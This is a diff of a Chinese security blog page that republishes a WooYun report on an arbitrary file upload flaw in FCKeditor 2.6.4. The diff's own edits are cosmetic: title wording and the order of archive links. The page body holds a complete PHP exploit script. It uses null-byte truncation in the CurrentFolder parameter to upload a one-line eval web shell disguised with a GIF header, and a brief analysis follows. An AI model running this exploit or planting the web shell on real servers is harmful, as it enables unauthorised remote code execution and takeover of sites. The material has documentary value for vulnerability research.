@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
     <title>
         
-        fckeditor &gt;= 2.6.4 任意文件上传漏洞 · \xeb\xfe&#39;s Blog
+        fckeditor2.6.4 任意文件上传漏洞 · \xeb\xfe&#39;s Blog
         
     </title>
     <link rel="icon" href= /assests/favicon.ico>
@@ -118,7 +118,7 @@ white-space: pre;
                 <a href="/" >\xeb\xfe&#39;s Blog.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">fckeditor >= 2.6.4 任意文件上传漏洞</a>
+                <a href="#" class="post-name">fckeditor2.6.4 任意文件上传漏洞</a>
             </div>
     </div>
     
@@ -139,7 +139,7 @@ white-space: pre;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            fckeditor >= 2.6.4 任意文件上传漏洞
+            fckeditor2.6.4 任意文件上传漏洞
             <!-- 404 -->
             
         </h1>
@@ -238,7 +238,7 @@ white-space: pre;
 <h3 id="详细说明"><a href="#详细说明" class="headerlink" title="详细说明"></a>详细说明</h3><p>currentfolder过滤不给力，导致%00截断上传任意文件</p>
 <h3 id="漏洞证明"><a href="#漏洞证明" class="headerlink" title="漏洞证明"></a>漏洞证明</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">"default_socket_timeout"</span>, <span class="number">5</span>);</span><br><span class="line">define(STDIN, fopen(<span class="string">"php://stdin"</span>, <span class="string">"r"</span>));</span><br><span class="line">$match = <span class="keyword">array</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">http_send</span><span class="params">($host, $packet)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$sock = fsockopen($host, <span class="number">80</span>);</span><br><span class="line">	<span class="keyword">while</span> (!$sock)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"\n[-] No response from &#123;$host&#125;:80 Trying again..."</span>;</span><br><span class="line">		$sock = fsockopen($host, <span class="number">80</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	fputs($sock, $packet);</span><br><span class="line">	<span class="keyword">while</span> (!feof($sock)) $resp .= fread($sock, <span class="number">1024</span>);</span><br><span class="line">	fclose($sock);</span><br><span class="line">	<span class="keyword">print</span> $resp;</span><br><span class="line">	<span class="keyword">return</span> $resp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">connector_response</span><span class="params">($html)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $match;</span><br><span class="line">	<span class="keyword">return</span> (preg_match(<span class="string">"/OnUploadCompleted\((\d),\"(.*)\"\)/"</span>, $html, $match) &amp;&amp; in_array($match[<span class="number">1</span>], <span class="keyword">array</span>(<span class="number">0</span>, <span class="number">201</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n+------------------------------------------------------------------+"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n| FCKEditor Servelet Arbitrary File Upload Exploit by Wolegequ     |"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n+------------------------------------------------------------------+\n"</span>;</span><br><span class="line"><span class="keyword">if</span> ($argv &lt; <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"\nUsage......: php $argv[0] host path\n"</span>;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"\nExample....: php $argv[0] localhost /\n"</span>;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"\nExample....: php $argv[0] localhost /FCKEditor/\n"</span>;</span><br><span class="line">	<span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$host = $argv[<span class="number">1</span>];</span><br><span class="line">$path = ereg_replace(<span class="string">"(/)&#123;2,&#125;"</span>, <span class="string">"/"</span>, $argv[<span class="number">2</span>]);</span><br><span class="line">$filename  = <span class="string">"fvck.gif"</span>;</span><br><span class="line">$foldername = <span class="string">"fuck.php%00.gif"</span>;</span><br><span class="line">$connector = <span class="string">"editor/filemanager/connectors/php/connector.php"</span>;</span><br><span class="line">$payload  = <span class="string">"-----------------------------265001916915724\r\n"</span>;</span><br><span class="line">$payload .= <span class="string">"Content-Disposition: form-data; name=\"NewFile\"; filename=\"&#123;$filename&#125;\"\r\n"</span>;</span><br><span class="line">$payload .= <span class="string">"Content-Type:  image/jpeg\r\n\r\n"</span>;</span><br><span class="line">$payload .= <span class="string">'GIF89a'</span>.<span class="string">"\r\n"</span>.<span class="string">'&lt;?php eval($_POST[a]) ?&gt;'</span>.<span class="string">"\n"</span>;</span><br><span class="line">$payload .= <span class="string">"-----------------------------265001916915724--\r\n"</span>;</span><br><span class="line">$packet	 = <span class="string">"POST &#123;$path&#125;&#123;$connector&#125;?Command=FileUpload&amp;Type=Image&amp;CurrentFolder="</span>.$foldername.<span class="string">" HTTP/1.0\r\n"</span>;</span><br><span class="line"><span class="comment">//print $packet;</span></span><br><span class="line">$packet	.= <span class="string">"Host: &#123;$host&#125;\r\n"</span>;</span><br><span class="line">$packet .= <span class="string">"Content-Type: multipart/form-data; boundary=---------------------------265001916915724\r\n"</span>;</span><br><span class="line">$packet .= <span class="string">"Content-Length: "</span>.strlen($payload).<span class="string">"\r\n"</span>;</span><br><span class="line">$packet .= <span class="string">"Connection: close\r\n\r\n"</span>;</span><br><span class="line">$packet .= $payload;</span><br><span class="line"><span class="keyword">print</span> $packet;</span><br><span class="line"><span class="keyword">if</span> (!connector_response(http_send($host, $packet))) <span class="keyword">die</span>(<span class="string">"\n[-] Upload failed!\n"</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">print</span> <span class="string">"\n[-] Job done! try http://$&#123;host&#125;/$match[2] \n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><p>我们看到这个请求主要是修改CurrentFolder为 <code>fuck.php%00.gif</code> ，通过%00截断上传，上传一个fuck.php文件。fuck.php文件里面写了一句话木马<br><code>&#39;GIF89a&#39;.&quot;\r\n&quot;.&#39;&lt;?php eval($_POST[a]) ?&gt;&#39;.&quot;\n&quot;;</code>,GIF89a文件头只是为了绕过检测。</p>
-<p>原文链接：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2010-01684.html" target="_blank" rel="noopener">fckeditor &gt;= 2.6.4 任意文件上传漏洞</a></p>
+<p>原文链接：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2010-01684.html" target="_blank" rel="noopener">fckeditor 2.6.4 任意文件上传漏洞</a></p>
 
     </article>
     <!-- 前后页  -->
@@ -565,8 +565,6 @@ white-space: pre;
     
     
     
-    
-    
     <div class="total-archive" >目前才写: 18 篇博文，好好努力吧，骚年。 </div>
     
     <div class="post-archive">
@@ -584,27 +582,12 @@ white-space: pre;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/10</span><a class="archive-post-title" href= "/2017/12/10/wooyun-1000php-15/" >fckeditor >= 2.6.4 任意文件上传漏洞</a>
+            <span class="archive-post-date">12/10</span><a class="archive-post-title" href= "/2017/12/10/wooyun-1000php-15/" >fckeditor2.6.4 任意文件上传漏洞</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">12/10</span><a class="archive-post-title" href= "/2017/12/10/wooyun-1000php-14/" >PHPCMS V9 通行证注册缺陷</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-8/" >phpcms2008本地文件包括及利用（执行任意SQL脚本）</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-11/" >Ecshop2.7.2持久型XSS（可获得管理员帐号）</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-10/" >HZCMS 合正网站群内容管理系统SQL注射漏洞</a>
         </li>
     
     
@@ -619,6 +602,21 @@ white-space: pre;
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-10/" >HZCMS 合正网站群内容管理系统SQL注射漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-8/" >phpcms2008本地文件包括及利用（执行任意SQL脚本）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-11/" >Ecshop2.7.2持久型XSS（可获得管理员帐号）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-12/" >游戏风云cms存在SQL注入</a>
         </li>
     
@@ -629,12 +627,12 @@ white-space: pre;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-6/" >phpcms 2008 sp4 爆路径及任意文件删除漏洞</a>
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-4/" >Discuz!漫游插件API本地包含漏洞</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-4/" >Discuz!漫游插件API本地包含漏洞</a>
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-6/" >phpcms 2008 sp4 爆路径及任意文件删除漏洞</a>
         </li>
     
     
